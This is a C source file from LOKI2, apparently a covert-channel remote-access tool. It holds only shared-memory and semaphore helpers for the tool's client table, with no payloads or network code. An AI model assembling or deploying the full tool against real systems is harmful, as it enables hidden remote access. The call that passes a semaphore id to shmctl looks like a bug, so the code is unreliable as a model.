/*
 * LOKI2
 *
 * [ shm.c ]
 *
 *  1996/7 Guild Corporation Worldwide      [daemon9]
 */


#include "loki.h"
#include "client_db.h"
#include "shm.h"

extern struct loki rdg;
extern int verbose;
extern int destroy_shm;
struct client_list *client = 0;
int semid;

#ifdef STRONG_CRYPTO
extern short ivec_salt;
extern u_char user_key[BF_KEYSIZE];
#endif

/*
 *  Prepare shared memory and semaphore
 */

void prep_shm()
{

    key_t shmkey    = SHM_KEY + getpid();  /* shared memory key ID */
    key_t semkey    = SEM_KEY + getpid();  /* semaphore key ID     */
    int shmid, len  = 0, i = 0;

    len             = sizeof(struct client_list) * MAX_CLIENT;

                                        /* Request a shared memory segment */
    if ((shmid = shmget(shmkey, len, IPC_CREAT)) < 0)
        err_exit(1, 1, verbose, "[fatal] shared mem segment request error");

                                        /* Get SET_SIZE semaphore to perform 
                                         * shared memory locking with
                                         */
    if ((semid = semget(semkey, SET_SIZE, (IPC_CREAT | SHM_PRM))) < 0)
        err_exit(1, 1, verbose, "[fatal] semaphore allocation error ");

                                        /* Attach pointer to the shared memory
                                         * segment
                                         */                       
    client = (struct client_list *) shmat(shmid, NULL, (int)NULL);
                                        /* clear the database */
    for (; i < MAX_CLIENT; i++) bzero(&client[i], sizeof(client[i]));
}


/*
 *  Locks the semaphore so the caller can access the shared memory segment.
 *  This is an atomic operation.
 */

void locks()
{

    struct sembuf lock[2] = 
    {
        {0, 0, 0},
        {0, 1, SEM_UNDO}
    };

    if (semop(semid, &lock[0], 2) < 0)
        err_exit(1, 1, verbose, "[fatal] could not lock memory");
}


/*
 *  Unlocks the semaphore so the caller can access the shared memory segment.
 *  This is an atomic operation.
 */

void ulocks()
{

    struct sembuf ulock[1] = 
    {
        { 0, -1, (IPC_NOWAIT | SEM_UNDO) }
    };

    if (semop(semid, &ulock[0], 1) < 0)
        err_exit(1, 1, verbose, "[fatal] could not unlock memory");
}                      


/*
 *  Release the shared memory segment.
 */

void dump_shm()
{

    locks();
    if ((shmdt((u_char *)client)) == -1)
        err_exit(1, 1, verbose, "[fatal] shared mem segment detach error");

    if (destroy_shm == OK)
    {
        if ((shmctl(semid, IPC_RMID, NULL)) == -1)
            err_exit(1, 1, verbose, "[fatal] cannot destroy shmid");

        if ((semctl(semid, IPC_RMID, (int)NULL, NULL)) == -1)
            err_exit(1, 1, verbose, "[fatal] cannot destroy semaphore");
    }
    ulocks();
}
    
/* EOF */
